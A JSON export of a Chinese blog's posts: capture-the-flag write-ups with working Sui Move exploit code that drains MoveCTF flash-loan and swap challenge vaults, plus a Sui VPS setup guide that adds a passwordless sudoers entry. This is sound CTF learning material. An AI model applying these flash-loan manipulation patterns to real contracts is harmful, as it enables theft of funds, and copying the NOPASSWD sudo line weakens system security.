[{"content":"考察闪电贷 题目源码 https://github.com/movebit/movectf2024-day1/tree/main/swap\n环境搭建 部署后，先调用初始化函数\n#!/bin/bash PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA\u0026lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA\u0026gt; a_type=\u0026#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA\u0026#39; mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB\u0026lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB\u0026gt; b_type=\u0026#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB\u0026#39; sui client call --package $PackageID \\ --module vault \\ --function initialize \\ --type-args $a_type $b_type \\ --args $minta $mintb \\ # public entry fun initialize\u0026lt;A,B\u0026gt;(capa: MintA\u0026lt;A\u0026gt;, capb: MintB\u0026lt;B\u0026gt;,ctx: \u0026amp;mut TxContext) { # let vault = Vault\u0026lt;A, B\u0026gt; { # id: object::new(ctx), # coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), # coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), # flashed: false # }; # transfer::share_object(vault); # } 初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB\n分析 题目要求把资金池抽干\npublic fun get_flag\u0026lt;A,B\u0026gt;(vault: \u0026amp;Vault\u0026lt;A,B\u0026gt;, ctx: \u0026amp;TxContext) { assert!( balance::value(\u0026amp;vault.coin_a) == 0 \u0026amp;\u0026amp; balance::value(\u0026amp;vault.coin_b) == 0, 123 ); event::emit( Flag { win: true, sender: tx_context::sender(ctx) } ); } 交换时，按照资金池里两种token的比例进行兑换\npublic fun swap_a_to_b\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina:Coin\u0026lt;A\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;B\u0026gt; { let amount_out_B = coin::value(\u0026amp;coina) * balance::value(\u0026amp;vault.coin_b) / balance::value(\u0026amp;vault.coin_a); coin::put\u0026lt;A\u0026gt;(\u0026amp;mut vault.coin_a, coina); coin::take(\u0026amp;mut vault.coin_b, amount_out_B, ctx) } 即output_B / intput_A = balance_B / balance_A\n使用闪电贷可以轻易的操纵这两种token的比例balance_B / balance_A\npublic fun flash\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, amount: u64, a_to_b: bool, ctx: \u0026amp;mut TxContext): (Coin\u0026lt;A\u0026gt;, Coin\u0026lt;B\u0026gt;, Receipt) { assert!(!vault.flashed, 1); let (coin_a, coin_b) = if (a_to_b) { (coin::zero\u0026lt;A\u0026gt;(ctx), coin::from_balance(balance::split(\u0026amp;mut vault.coin_b, amount ), ctx)) } else { (coin::from_balance(balance::split(\u0026amp;mut vault.coin_a, amount ), ctx), coin::zero\u0026lt;B\u0026gt;(ctx)) }; let receipt = Receipt { id: object::id(vault), a_to_b, repay_amount: amount }; vault.flashed = true; (coin_a, coin_b, receipt) } 利用 /// Module: exp module exp::exp { use sui::tx_context::TxContext; use sui::balance::{Self, Balance}; use sui::coin::{Self, Coin}; use swap::vault::{Self, Vault,swap_a_to_b}; public entry fun exp1\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina:Coin\u0026lt;A\u0026gt;, ctx: \u0026amp;mut TxContext) { //in vault, A:100,B:100 //flashloan 99 coina let (coin_a, coin_b, receipt) = vault::flash(vault, 99, false, ctx); //in vault, A:1,B:100 let mut input_balance= coin::into_balance(coina);//10 let coinb = swap_a_to_b(vault,coin::from_balance(balance::split(\u0026amp;mut input_balance,1),ctx), ctx); transfer::public_transfer(coinb, tx_context::sender(ctx)); let change = coin::from_balance(input_balance, ctx); transfer::public_transfer(change, tx_context::sender(ctx)); //in vault, A:2,B:0 //repay 99 coina vault::repay_flash(vault, coin_a, coin_b, receipt); //in vault, A:101,B:0 // flashloan all let (coin_a, coin_b, receipt) = vault::flash(vault, 101, false, ctx); vault::get_flag(vault, ctx); vault::repay_flash(vault, coin_a, coin_b, receipt); } } ","permalink":"https://m4sk93.github.io/posts/movectf2024_swap/","summary":"考察闪电贷 题目源码 https://github.com/movebit/movectf2024-day1/tree/main/swap\n环境搭建 部署后，先调用初始化函数\n#!/bin/bash PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA\u0026lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA\u0026gt; a_type=\u0026#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA\u0026#39; mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9 #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB\u0026lt;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB\u0026gt; b_type=\u0026#39;0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB\u0026#39; sui client call --package $PackageID \\ --module vault \\ --function initialize \\ --type-args $a_type $b_type \\ --args $minta $mintb \\ # public entry fun initialize\u0026lt;A,B\u0026gt;(capa: MintA\u0026lt;A\u0026gt;, capb: MintB\u0026lt;B\u0026gt;,ctx: \u0026amp;mut TxContext) { # let vault = Vault\u0026lt;A, B\u0026gt; { # id: object::new(ctx), # coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), # coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), # flashed: false # }; # transfer::share_object(vault); # } 初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB","title":"MoveCTF2024_Swap"},{"content":"原题目在https://github.com/movebit/movectf-4/blob/master/sources/module.move 考察闪电贷 由于Move2024有些变化，我对源码做了微调https://github.com/m4sk93/movectf/tree/main/movectf2022/flashloan\n环境搭建 参考MoveCTF2022 Checkin部署题目后，\n为了后续调用方便，在配置文件中添加package ID\n[package] name = \u0026#34;movectf2022_flashloan\u0026#34; edition = \u0026#34;2024.beta\u0026#34; # edition = \u0026#34;legacy\u0026#34; to use legacy (pre-2024) Move # license = \u0026#34;\u0026#34; # e.g., \u0026#34;MIT\u0026#34;, \u0026#34;GPL\u0026#34;, \u0026#34;Apache 2.0\u0026#34; # authors = [\u0026#34;...\u0026#34;] # e.g., [\u0026#34;Joe Smith (joesmith@noemail.com)\u0026#34;, \u0026#34;John Snow (johnsnow@noemail.com)\u0026#34;] published-at = \u0026#34;0x2a61d471519b8e85a7730bebcfc3c5cace6ffffb2f5576d593821422d514adc2\u0026#34; # package id [dependencies] Sui = { git = \u0026#34;https://github.com/MystenLabs/sui.git\u0026#34;, subdir = \u0026#34;crates/sui-framework/packages/sui-framework\u0026#34;, rev = \u0026#34;framework/testnet\u0026#34; } [addresses] #movectf2022_flashloan = \u0026#34;0x0\u0026#34; movectf2022_flashloan = \u0026#34;0x2a61d471519b8e85a7730bebcfc3c5cace6ffffb2f5576d593821422d514adc2\u0026#34; # package id 编写exp 为了调用题目，在配置文件中添加依赖\n[dependencies] Sui = { git = \u0026#34;https://github.com/MystenLabs/sui.git\u0026#34;, subdir = \u0026#34;crates/sui-framework/packages/sui-framework\u0026#34;, rev = \u0026#34;framework/testnet\u0026#34; } movectf2022_flashloan= { local = \u0026#34;../movectf2022_flashloan/\u0026#34; } 初步分析getflag时会检查是否已经把池子抽干,\n// check whether you can get the flag public entry fun get_flag(self: \u0026amp;mut FlashLender, ctx: \u0026amp;mut TxContext) { if (balance::value(\u0026amp;self.to_lend) == 0) { event::emit(Flag { user: tx_context::sender(ctx), flag: true }); } } 直接试试：\n/// Module: exp module exp::exp { use sui::tx_context::TxContext; use movectf2022_flashloan::flash::{Self, FlashLender}; public entry fun exp1(lender: \u0026amp;mut FlashLender, ctx: \u0026amp;mut TxContext) { let (coin, receipt) = flash::loan(lender, 1000, ctx); flash::get_flag(lender, ctx); } } 结果编译时就报错\nerror[E06001]: unused value without \u0026#39;drop\u0026#39; ┌─ ./sources/exp.move:9:37 │ 8 │ let (coin, receipt) = flash::loan(lender, 1000, ctx); │ ---- The local variable \u0026#39;coin\u0026#39; still contains a value. The value does not have the \u0026#39;drop\u0026#39; ability and must be consumed before the function returns 9 │ flash::get_flag(lender, ctx); │ ^ Invalid return │ ┌─ ./../movectf2022_flashloan/sources/movectf2022_flashloan.move:54:9 │ 54 │ ): (Coin\u0026lt;FLASH\u0026gt;, Receipt) { │ ----------- The type \u0026#39;sui::coin::Coin\u0026lt;movectf2022_flashloan::flash::FLASH\u0026gt;\u0026#39; does not have the ability \u0026#39;drop\u0026#39; │ ┌─ /home/kali/.move/https___github_com_MystenLabs_sui_git_framework__testnet/crates/sui-framework/packages/sui-framework/sources/coin.move:35:19 │ 35 │ public struct Coin\u0026lt;phantom T\u0026gt; has key, store { │ ---- To satisfy the constraint, the \u0026#39;drop\u0026#39; ability would need to be added here error[E06001]: unused value without \u0026#39;drop\u0026#39; ┌─ ./sources/exp.move:9:37 │ 8 │ let (coin, receipt) = flash::loan(lender, 1000, ctx); │ ------- The local variable \u0026#39;receipt\u0026#39; still contains a value. The value does not have the \u0026#39;drop\u0026#39; ability and must be consumed before the function returns 9 │ flash::get_flag(lender, ctx); │ ^ Invalid return │ ┌─ ./../movectf2022_flashloan/sources/movectf2022_flashloan.move:24:19 │ 24 │ public struct Receipt { │ ------- To satisfy the constraint, the \u0026#39;drop\u0026#39; ability would need to be added here · 54 │ ): (Coin\u0026lt;FLASH\u0026gt;, Receipt) { │ ------- The type \u0026#39;movectf2022_flashloan::flash::Receipt\u0026#39; does not have the ability \u0026#39;drop\u0026#39; 所以必须对coin和receipt进行处理,不能让你贷完就跑路\n注意看代码里的这个结构体：\npublic struct Receipt { flash_lender_id: ID, amount: u64 } 参考 Hot Potato (Hot Potato is a name for a struct that has no abilities, hence it can only be packed and unpacked in its module. In this struct, you must call function B after function A in the case where function A returns a potato and function B consumes it.)\n/// Module: exp module exp::exp { use sui::tx_context::TxContext; use movectf2022_flashloan::flash::{Self, FlashLender}; public entry fun exp1(lender: \u0026amp;mut FlashLender, ctx: \u0026amp;mut TxContext) { let (coin, receipt) = flash::loan(lender, 1000, ctx); flash::get_flag(lender, ctx); flash::repay(lender, coin); flash::check(lender, receipt); } } 有借有还，这下成功了.\n问题来了，可以不还吗？？？\n还有一种利用方式\n/// Module: exp module exp::exp { use sui::tx_context::TxContext; use movectf2022_flashloan::flash::{Self, FlashLender}; public entry fun exp1(lender: \u0026amp;mut FlashLender, ctx: \u0026amp;mut TxContext) { let (coin, receipt) = flash::loan(lender, 1000, ctx); flash::get_flag(lender, ctx); flash::repay(lender, coin); flash::check(lender, receipt); } public entry fun exp2(lender: \u0026amp;mut FlashLender, ctx: \u0026amp;mut TxContext) { let (coin, receipt) = flash::loan(lender, 1000, ctx); flash::deposit(lender, coin, ctx); flash::check(lender, receipt); flash::withdraw(lender, 1000, ctx); flash::get_flag(lender, ctx); } } 问题在于：coin可以通过deposit消耗掉.通过check消耗receipt时不需要发送coin.而且check判断余额的方式也不对。\n拓展 https://github.com/movebit/movectf2024-day1/tree/main/swap\n参考资料 感谢大佬们无私分享\nMoveCTF 2022 题解 MoveCTF 所有题解Writeup ","permalink":"https://m4sk93.github.io/posts/movectf2022_3/","summary":"原题目在https://github.com/movebit/movectf-4/blob/master/sources/module.move 考察闪电贷 由于Move2024有些变化，我对源码做了微调https://github.com/m4sk93/movectf/tree/main/movectf2022/flashloan\n环境搭建 参考MoveCTF2022 Checkin部署题目后，\n为了后续调用方便，在配置文件中添加package ID\n[package] name = \u0026#34;movectf2022_flashloan\u0026#34; edition = \u0026#34;2024.beta\u0026#34; # edition = \u0026#34;legacy\u0026#34; to use legacy (pre-2024) Move # license = \u0026#34;\u0026#34; # e.g., \u0026#34;MIT\u0026#34;, \u0026#34;GPL\u0026#34;, \u0026#34;Apache 2.0\u0026#34; # authors = [\u0026#34;...\u0026#34;] # e.g., [\u0026#34;Joe Smith (joesmith@noemail.com)\u0026#34;, \u0026#34;John Snow (johnsnow@noemail.com)\u0026#34;] published-at = \u0026#34;0x2a61d471519b8e85a7730bebcfc3c5cace6ffffb2f5576d593821422d514adc2\u0026#34; # package id [dependencies] Sui = { git = \u0026#34;https://github.com/MystenLabs/sui.git\u0026#34;, subdir = \u0026#34;crates/sui-framework/packages/sui-framework\u0026#34;, rev = \u0026#34;framework/testnet\u0026#34; } [addresses] #movectf2022_flashloan = \u0026#34;0x0\u0026#34; movectf2022_flashloan = \u0026#34;0x2a61d471519b8e85a7730bebcfc3c5cace6ffffb2f5576d593821422d514adc2\u0026#34; # package id 编写exp 为了调用题目，在配置文件中添加依赖","title":"MoveCTF2022 FlashLoan"},{"content":"本文通过MoveCTF2022的签到题，介绍Sui基本的发布、测试方法。 Sui开发环境搭建请参考 使用VPS从0搭建Sui开发环境 原题目在https://github.com/movebit/movectf-1/blob/master/sources/module.move\n搭建题目环境 在testnet搭建\n由于Move2024版本的变化，调整了下源码\ntest@VM-0-7-debian:~$ sui client switch --env testnet Active environment switched to [testnet] test@VM-0-7-debian:~$ sui move new movectf2022_checkin test@VM-0-7-debian:~$ cd movectf2022_checkin/ test@VM-0-7-debian:~/movectf2022_checkin$ ls Move.toml sources tests test@VM-0-7-debian:~/movectf2022_checkin$ cd sources/ test@VM-0-7-debian:~/movectf2022_checkin/sources$ ls movectf2022_checkin.move test@VM-0-7-debian:~/movectf2022_checkin/sources$ vim movectf2022_checkin.move test@VM-0-7-debian:~/movectf2022_checkin/sources$ cat movectf2022_checkin.move /// Module: movectf2022_checkin module movectf2022_checkin::movectf2022_checkin { use sui::event; use sui::tx_context::{Self, TxContext}; ///Visibility annotations are required on struct declarations from the Move 2024 edition onwards. ///struct Flag has copy, drop { public struct Flag has copy, drop { user: address, flag: bool } public entry fun get_flag(ctx: \u0026amp;mut TxContext) { event::emit(Flag { user: tx_context::sender(ctx), flag: true }) } } test@VM-0-7-debian:~/movectf2022_checkin$ sui move build ...... test@VM-0-7-debian:~/movectf2022_checkin$ sui client publish ...... │ Published Objects: │ │ ┌── │ │ │ PackageID: 0xa4dad4ee99aa00397e68a32173a36d4c0ad66fe79e4d448df2b5c9c09f90ab6b │ │ │ Version: 1 │ │ │ Digest: CMCrLDaHtcLy8pvecy55xVvDVcAUz36hsqYBkEkpUThh │ │ │ Modules: movectf2022_checkin │ │ └── 获取flag 直接调用接口即可,通过event返回flag\ntest@VM-0-7-debian:~/movectf2022_checkin$ vim call.sh test@VM-0-7-debian:~/movectf2022_checkin$ cat call.sh #!/bin/bash PackageID=0xa4dad4ee99aa00397e68a32173a36d4c0ad66fe79e4d448df2b5c9c09f90ab6b sui client call --package $PackageID \\ --module movectf2022_checkin \\ --function get_flag test@VM-0-7-debian:~/movectf2022_checkin$ chmod +x call.sh test@VM-0-7-debian:~/movectf2022_checkin$ ./call.sh ... ╭─────────────────────────────────────────────────────────────────────────────────────────────────────────────╮ │ Transaction Block Events │ ├─────────────────────────────────────────────────────────────────────────────────────────────────────────────┤ │ ┌── │ │ │ EventID: 3ntybkcdkNLriDtfYyiJ9yhCMdMEUzTbdgyLQzt2ww7p:0 │ │ │ PackageID: 0xa4dad4ee99aa00397e68a32173a36d4c0ad66fe79e4d448df2b5c9c09f90ab6b │ │ │ Transaction Module: movectf2022_checkin │ │ │ Sender: 0x041f524144f3b0607099f7370a3184f4093510ade5c123409ed76440c8a50537 │ │ │ EventType: 0xa4dad4ee99aa00397e68a32173a36d4c0ad66fe79e4d448df2b5c9c09f90ab6b::movectf2022_checkin::Flag │ │ │ ParsedJSON: │ │ │ ┌──────┬────────────────────────────────────────────────────────────────────┐ │ │ │ │ flag │ true │ │ │ │ ├──────┼────────────────────────────────────────────────────────────────────┤ │ │ │ │ user │ 0x041f524144f3b0607099f7370a3184f4093510ade5c123409ed76440c8a50537 │ │ │ │ └──────┴────────────────────────────────────────────────────────────────────┘ │ │ └── │ ╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────╯ ... ","permalink":"https://m4sk93.github.io/posts/movectf2022_1/","summary":"本文通过MoveCTF2022的签到题，介绍Sui基本的发布、测试方法。 Sui开发环境搭建请参考 使用VPS从0搭建Sui开发环境 原题目在https://github.com/movebit/movectf-1/blob/master/sources/module.move\n搭建题目环境 在testnet搭建\n由于Move2024版本的变化，调整了下源码\ntest@VM-0-7-debian:~$ sui client switch --env testnet Active environment switched to [testnet] test@VM-0-7-debian:~$ sui move new movectf2022_checkin test@VM-0-7-debian:~$ cd movectf2022_checkin/ test@VM-0-7-debian:~/movectf2022_checkin$ ls Move.toml sources tests test@VM-0-7-debian:~/movectf2022_checkin$ cd sources/ test@VM-0-7-debian:~/movectf2022_checkin/sources$ ls movectf2022_checkin.move test@VM-0-7-debian:~/movectf2022_checkin/sources$ vim movectf2022_checkin.move test@VM-0-7-debian:~/movectf2022_checkin/sources$ cat movectf2022_checkin.move /// Module: movectf2022_checkin module movectf2022_checkin::movectf2022_checkin { use sui::event; use sui::tx_context::{Self, TxContext}; ///Visibility annotations are required on struct declarations from the Move 2024 edition onwards. ///struct Flag has copy, drop { public struct Flag has copy, drop { user: address, flag: bool } public entry fun get_flag(ctx: \u0026amp;mut TxContext) { event::emit(Flag { user: tx_context::sender(ctx), flag: true }) } } test@VM-0-7-debian:~/movectf2022_checkin$ sui move build .","title":"MoveCTF2022 Checkin "},{"content":"购买VPS 在腾讯或阿里云购买一个香港的VPS，购买一个月即可，大概30块钱，不要舍不得，你会赚回来的这个月内，完成几个letsmove的学习任务，你就有钱买一年的美国VPS啦（用加密货币支付）。\n比如我就用学习的奖励买了个域名和服务器，搭建了一个关于Sui的资源导航网站Suiapps(欢迎大家提交PR)。\n本文就是记录在这个全新的VPS上，从0开始搭建Sui的开发环境。\n搭建环境 ssh登录vps后，如果使用的是root账户,一定要新建一个普通权限账户(有些软件不允许使用root运行，比如马上用到的brew),并且将他添加到sudo组里.\nroot@VM-0-7-debian:~# useradd -m test root@VM-0-7-debian:~# echo \u0026#39;test ALL=(ALL) NOPASSWD:ALL\u0026#39; \u0026gt;\u0026gt; /etc/sudoers root@VM-0-7-debian:~# su test $ bash test@VM-0-7-debian:/root$ ls ls: cannot open directory \u0026#39;.\u0026#39;: Permission denied test@VM-0-7-debian:/root$ cd test@VM-0-7-debian:~$ ls 参考官方文档搭建环境\nhttps://docs.sui.io/guides/developer/getting-started/sui-install\n使用brew安装sui 由于VPS的性能不够，所以不能使用源码安装sui，采用brew安装，先安装brew.\n使用普通权限账户执行一下命令\n/bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; (echo; echo \u0026#39;eval \u0026#34;$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)\u0026#34;\u0026#39;) \u0026gt;\u0026gt; /home/test/.profile eval \u0026#34;$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)\u0026#34; 然后安装sui\ntest@VM-0-7-debian:~$ brew install sui ==\u0026gt; Auto-updating Homebrew... Adjust how often this is run with HOMEBREW_AUTO_UPDATE_SECS or disable with HOMEBREW_NO_AUTO_UPDATE. Hide these hints with HOMEBREW_NO_ENV_HINTS (see `man brew`). ==\u0026gt; Downloading https://ghcr.io/v2/homebrew/core/sui/manifests/1.26.0 ###################################################################################################################################################### 100.0% ==\u0026gt; Fetching sui ==\u0026gt; Downloading https://ghcr.io/v2/homebrew/core/sui/blobs/sha256:a68e100359a64e93b42de54a296e23c246e4cd15be3ecbc21e1c7ee942a2e126 ###################################################################################################################################################### 100.0% ==\u0026gt; Pouring sui--1.26.0.x86_64_linux.bottle.tar.gz 🍺 /home/linuxbrew/.linuxbrew/Cellar/sui/1.26.0: 9 files, 127.6MB ==\u0026gt; Running `brew cleanup sui`... Disable this behaviour by setting HOMEBREW_NO_INSTALL_CLEANUP. Hide these hints with HOMEBREW_NO_ENV_HINTS (see `man brew`). test@VM-0-7-debian:~$ sui -V sui 1.26.0-homebrew client设置testnet 第一次执行sui client 会生成配置文件~/.sui/sui_config/client.yaml\ntest@VM-0-7-debian:~$ sui client Config file [\u0026#34;/home/test/.sui/sui_config/client.yaml\u0026#34;] doesn\u0026#39;t exist, do you want to connect to a Sui Full node server [y/N]?y Sui Full node server URL (Defaults to Sui Testnet if not specified) : https://fullnode.testnet.sui.io:443 Environment alias for [https://fullnode.testnet.sui.io:443] : testnet Select key scheme to generate keypair (0 for ed25519, 1 for secp256k1, 2: for secp256r1): 0 初始化钱包后，会打印助记词，记录下来\n获取测试币 获取钱包地址\ntest@VM-0-7-debian:~$ sui client addresses ╭──────────────────────┬────────────────────────────────────────────────────────────────────┬────────────────╮ │ alias │ address │ active address │ ├──────────────────────┼────────────────────────────────────────────────────────────────────┼────────────────┤ │ youthful-hypersthene │ 0x041f524144f3b0607099f7370a3184f4093510ade5c123409ed76440c8a50537 │ * │ ╰──────────────────────┴────────────────────────────────────────────────────────────────────┴────────────────╯ 使用curl在水龙头拿币\ncurl --location --request POST \u0026#39;https://faucet.testnet.sui.io/gas\u0026#39; \\ --header \u0026#39;Content-Type: application/json\u0026#39; \\ --data-raw \u0026#39;{ \u0026#34;FixedAmountRequest\u0026#34;: { \u0026#34;recipient\u0026#34;: \u0026#34;0x041f524144f3b0607099f7370a3184f4093510ade5c123409ed76440c8a50537\u0026#34; } }\u0026#39; 开始第一个应用 自此环境搭建完毕,建议新手再学习下vim的基本操作 https://docs.sui.io/guides/developer/first-app/write-package\n后续需要切换到主网\ntest@VM-0-7-debian:~$ sui client envs ╭─────────┬─────────────────────────────────────┬────────╮ │ alias │ url │ active │ ├─────────┼─────────────────────────────────────┼────────┤ │ testnet │ https://fullnode.testnet.sui.io:443 │ * │ ╰─────────┴─────────────────────────────────────┴────────╯ test@VM-0-7-debian:~$ sui client new-env --alias=mainnet --rpc https://fullnode.mainnet.sui.io:443 Added new Sui env [mainnet] to config. test@VM-0-7-debian:~$ sui client switch --env mainnet Active environment switched to [mainnet] test@VM-0-7-debian:~$ sui client envs ╭─────────┬─────────────────────────────────────┬────────╮ │ alias │ url │ active │ ├─────────┼─────────────────────────────────────┼────────┤ │ testnet │ https://fullnode.testnet.sui.io:443 │ │ │ mainnet │ https://fullnode.mainnet.sui.io:443 │ * │ ╰─────────┴─────────────────────────────────────┴────────╯ ","permalink":"https://m4sk93.github.io/posts/vps_sui_env/","summary":"购买VPS 在腾讯或阿里云购买一个香港的VPS，购买一个月即可，大概30块钱，不要舍不得，你会赚回来的这个月内，完成几个letsmove的学习任务，你就有钱买一年的美国VPS啦（用加密货币支付）。\n比如我就用学习的奖励买了个域名和服务器，搭建了一个关于Sui的资源导航网站Suiapps(欢迎大家提交PR)。\n本文就是记录在这个全新的VPS上，从0开始搭建Sui的开发环境。\n搭建环境 ssh登录vps后，如果使用的是root账户,一定要新建一个普通权限账户(有些软件不允许使用root运行，比如马上用到的brew),并且将他添加到sudo组里.\nroot@VM-0-7-debian:~# useradd -m test root@VM-0-7-debian:~# echo \u0026#39;test ALL=(ALL) NOPASSWD:ALL\u0026#39; \u0026gt;\u0026gt; /etc/sudoers root@VM-0-7-debian:~# su test $ bash test@VM-0-7-debian:/root$ ls ls: cannot open directory \u0026#39;.\u0026#39;: Permission denied test@VM-0-7-debian:/root$ cd test@VM-0-7-debian:~$ ls 参考官方文档搭建环境\nhttps://docs.sui.io/guides/developer/getting-started/sui-install\n使用brew安装sui 由于VPS的性能不够，所以不能使用源码安装sui，采用brew安装，先安装brew.\n使用普通权限账户执行一下命令\n/bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; (echo; echo \u0026#39;eval \u0026#34;$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)\u0026#34;\u0026#39;) \u0026gt;\u0026gt; /home/test/.profile eval \u0026#34;$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)\u0026#34; 然后安装sui\ntest@VM-0-7-debian:~$ brew install sui ==\u0026gt; Auto-updating Homebrew... Adjust how often this is run with HOMEBREW_AUTO_UPDATE_SECS or disable with HOMEBREW_NO_AUTO_UPDATE.","title":"使用VPS从0搭建Sui开发环境"}]